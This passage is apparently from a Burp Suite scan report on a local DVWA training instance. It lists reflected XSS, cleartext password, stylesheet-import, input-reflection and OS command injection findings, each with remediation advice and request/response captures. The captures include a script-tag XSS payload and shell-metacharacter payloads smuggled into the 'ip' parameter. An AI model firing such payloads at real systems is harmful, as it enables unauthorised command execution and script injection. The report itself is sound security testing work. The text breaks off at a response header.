    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csrf/test_credentials.php HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=14rjudolj2tblb00ul3pc3rb6v<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/test_credentials.php<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 31<br><br>username=<span class="HIGHLIGHT">oo4wt%3cscript%3ealert(1)%3c%2fscript%3egmyku</span>&amp;password=&amp;Login=Login</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:29 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1134<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br>&lt;h3 class="loginFail"&gt;Wrong password for '<span class="HIGHLIGHT">oo4wt&lt;script&gt;alert(1)&lt;/script&gt;gmyku</span>'&lt;/h3&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="21.2">21.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300100_cleartextsubmissionofpassword">Cleartext submission of password</a></span>
<br><a class="PREVNEXT" href="#21.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#21.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/test_credentials.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:7878/dvwa/vulnerabilities/csrf/test_credentials.php</li></ul>The form contains the following password field:<ul><li>password</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/117.html">CAPEC-117: Interception</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/test_credentials.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=imkcoof3ngrg4hgfev5dra3h1d<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:29 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1051<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br>&lt;div id="code"&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="../../vulnerabilities/csrf/test_credentials.php" method="post"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;fieldset&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt; <span class="HIGHLIGHT">&lt;input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="21.3">21.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#21.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#21.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/test_credentials.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/test_credentials.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=6d0tuosiom67985s6k92c1f71u<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:31:29 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1051<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/source.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/test_credentials.php<span class="HIGHLIGHT">/cf81fz/y5561o/qskxgt/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=6d0tuosiom67985s6k92c1f71u<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1051<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/source.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/csrf/test_credentials.php/cf81fz/dvwa/css/source.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=6d0tuosiom67985s6k92c1f71u<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1051<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="21.4">21.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#21.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/test_credentials.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>username</b> request parameter is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csrf/test_credentials.php HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=14rjudolj2tblb00ul3pc3rb6v<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/test_credentials.php<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 31<br><br>username=<span class="HIGHLIGHT">wwomkwlg1t</span>&amp;password=&amp;Login=Login</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:29 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1109<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Test Credenti<br><b>...[SNIP]...</b><br>&lt;h3 class="loginFail"&gt;Wrong password for '<span class="HIGHLIGHT">wwomkwlg1t</span>'&lt;/h3&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="22">22.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/</span>
<br><a class="PREVNEXT" href="#21">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23">Next</a>
<br>
<span class="BODH1" id="22.1">22.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100100_oscommandinjection">OS command injection</a></span>
<br><a class="PREVNEXT" href="#21.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/exec/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>ip</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands and retrieve the output in the application's responses. Additionally it is possible to inject time delay commands to verify the existence of the vulnerability.<br><br>The payload <b>|echo eghhos99xf w64gx1xwlw||a #' |echo eghhos99xf w64gx1xwlw||a #|" |echo eghhos99xf w64gx1xwlw||a #</b> was submitted in the ip parameter. The application's response appears to contain the output from the injected command, indicating that the command was executed.<br><br>Additionally, the payload <b>|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1</b> was submitted in the ip parameter. The application took <b>20220</b> milliseconds to respond to the request, compared with <b>3119</b> milliseconds for the original request, indicating that the injected command caused a time delay.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.</p>
<p>OS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application's own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.</p>
<p>If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks: </p>
<ul>
  <li>The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.</li>
  <li>The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.</li>
</ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/os-command-injection">Web Security Academy: OS command injection</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/248.html">CAPEC-248: Command Injection</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=c7cdvpm399l3cfpurfjl5o91db<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/exec/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 23<br><br>ip=708477<span class="HIGHLIGHT">%7cecho%20eghhos99xf%20w64gx1xwlw%7c%7ca%20%23'%20%7cecho%20eghhos99xf%20w64gx1xwlw%7c%7ca%20%23%7c%22%20%7cecho%20eghhos99xf%20w64gx1xwlw%7c%7ca%20%23</span>&amp;Submit=Submit</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:34:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4108<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;pre&gt;<span class="HIGHLIGHT">eghhos99xf w64gx1xwlw</span><br>&lt;/pre&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=c7cdvpm399l3cfpurfjl5o91db<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/exec/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 23<br><br>ip=165278<span class="HIGHLIGHT">%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1</span>&amp;Submit=Submit</span></div>
<h2>Response 2</h2>
